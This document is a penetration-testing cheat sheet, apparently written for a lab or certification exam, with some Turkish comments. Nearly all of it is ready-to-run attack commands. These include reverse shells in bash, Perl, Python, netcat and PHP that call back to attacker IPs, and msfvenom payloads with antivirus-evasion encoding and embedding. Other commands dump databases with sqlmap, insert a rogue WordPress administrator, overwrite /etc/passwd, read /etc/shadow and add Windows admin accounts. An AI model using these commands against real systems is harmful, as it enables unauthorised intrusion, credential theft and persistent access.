# Useful command

## Scan

### NMAP
```
nmap -A -Pn -n --top-ports 10000 -vvv -oN 192.168.27.68
nmap -sV -T5 -F -A 10.11.1.5 --open --script vuln
nmap -A -Pn -sC 10.11.1.8
nmap 10.11.1.31 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,mssql.instance-name=MSSQLSERVER,ms-sql-xp-cmdshell.cmd='type C:\"Documents and Settings"\Administrator\Desktop\proof.txt'
nmap 10.11.1.125 --script ftp*
```
### NIKTO
```
nikto -h 10.10.10.10:8000
```

### DIRBUSTER
```
dirb http://10.11.1.31
```

### SMB
```
enum4linux 10.11.1.8
smbclient //10.11.1.128/wwwroot
smbclient -L 10.11.1.128
```

### FTP
```
anonymous:anonymous
cd "Documents and Settings"
get servers.py

ls ../../../../../../../../../../../Docume~1/Administrateur/Bureau/
get
(remote-file) ../../../../../../../../../../../Docume~1/Administrateur/Bureau/proof.txt
(local-file) /root/Desktop/10.11.1.125.txt
```

### WORDPRESS

```
wpscan -u "http://10.11.1.234" --wordlist /usr/share/wordlists/rockyou.txt --username admin
```

## Get Shell & Listen:

### get shell

```
nc 192.168.56.1 4444 -e /bin/sh
```

the -e flag was not supported on the server’s implementation of netcat.:

```
mknod /tmp/backpipe p 
/bin/sh 0</tmp/backpipe | nc 192.168.56.1 4444 1>/tmp/backpipe
```

### listen:
```
nc -nvlp 4444
```

***

## Exploitation

### LFI

oneExample:
GET /../../../../xampp\php\extras\browscap.ini
GET /../../../../xampp/htdocs/blog/wp-config.php


### DB

#### Connect MariaDB
mysql -u root 10.10.10.10 -p Password@1

SQL Query for Wordpress:
```
INSERT INTO `databasename`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('4', 'demo', MD5('demo'), 'Your Name', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Your Name');
 
 
INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');
 
 
INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_user_level', '10');
```

#### SQLMAP
```
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dbs
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --tables -D cscart
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --columns -D cscart -T cscart_users
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dump -D cscart -T cscart_users
```

### Unstage & Stage Shell

Unstage Shell: (karşılaması nc -nvlp)
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.52 LPORT=443 -f asp > aspunstage-52.aspx
```
Stage Shell: (karşılaması msfconsole handler)
```
msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.52 LPORT=443 -f asp > aspstage_52.aspx
```

### Shell example

#### Reverse Shell Cheat Sheat

PHP Reverse Shell
```
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -e php/base64 -f raw > shell.php
```
Karşılaması

```
msf> use exploit/multi/handler
set payload php/reverse_php
set lhost 10.10.10.10
exploit
```

##### BASH

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

##### PERL

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

##### PYTHON

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

##### NETCAT

nc -e /bin/sh 10.0.0.1 1234

##### PHP PentestMonkey

http://pentestmonkey.net/tools/web-shells/php-reverse-shell
```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

##### PHP Windows-reverse-shell
https://github.com/Dhayalanb/windows-php-reverse-shell

##### PHP One Line Shell
```
<?php
shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.0.52/4444 0>&1'");
?>
```

##### JSP PAYLOAD TOMCAT
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.52 LPORT=443 -f war > shell-209.war
```

##### ASP Shell @Txt bypass
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.52 LPORT=443 -f asp -e x86/shikata_ga_nai -i 3 > 52.txt
cadaver http://10.11.1.229
curl -X MOVE --header "Destination:http://10.11.1.229/52.asp;.txt" "http://10.11.1.229/52.txt"
```

###### Upgrade Shell TTY

python -c 'import pty; pty.spawn("/bin/bash")'  

***

## PRIVILAGE ESCALATION

### C Compile

linux:
> gcc -o hello hello.c

windows 32 bit:
> i686-w64-mingw32-gcc -o hello.exe hello.c

windows 64 bit:
> x86_64-w64-mingw32 -o hello.exe hello.c

### File Transfer

Attacker machine

> python -m SimpleHTTPServer 8000

> python3 -m http.server 8000

Cadaver

```
cadaver http://10.11.1.13/scripts/
put /root/Desktop/shellLER/phpReverseShell/aspunstage.aspx
```

CURL

```
curl -X MOVE --header    "Destination:http://10.11.1.13/scripts/aspunstaged.asp" "http://10.11.1.13/scripts/aspunstaged.aspx"
```

Windows Commands:
> net user hacker hacker /add 
> net localgroup administrators IWAM_BOB /add

Linux Commands:
> cat /etc/issue
> uname -a
> cat /proc/version
> find / -perm -u=s -type f 2>/dev/null
> find / -perm -g=s -type f 2>/dev/null
> find / -perm -2 ! -type l -ls 2>/dev/null @Yazma yetkisi olan dosyalar
```
echo root::0:0:root:/root:/bin/bash > /etc/passwd
su
```

```
sudo nmap --interactive
!id
!cat /root/proof.txt
```

> netstat -ano
> cat config.php | grep db
> sudo -l
> run post/multi/recon/local_exploit_suggester

```
upload /root/Desktop/test/churrasco.exe C:\\Inetpub\\
shell
churrasco.exe “net user emr Password1 /add”
churrasco.exe “net localgroup Administrator emr /add”
```

> cat /etc/shadow @Normal kullanıcı göremez


## ANTIVIRUS BYPASS

Normal exploit

```
msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 X > ~/Desktop/shell_reverse.exe
```

MSF Encoded Exploit

```
msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -o ~/Desktop/shell_reverse_msf_encoded.exe
```

MSF Encoded Embedded Exploit

```
msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -x /usr/share/windows-binaries/plink.exe -o ~/Desktop/shell_reverse_msf_encoded_embedded.exe
```

Custom Tool:

```
i586-mingw32msvc-gcc reverse.c -o ~/Desktop/custom-reverse.exe -lws2_32
```


## FLAG & CAPTURE

whoami
ipconfig/ifconfig
type C:\"Documents and Settings"\Administrator\Desktop\proof.txt
cat /root/proof.txt
id
dir C:\ /s/b | find /i “proof.txt”
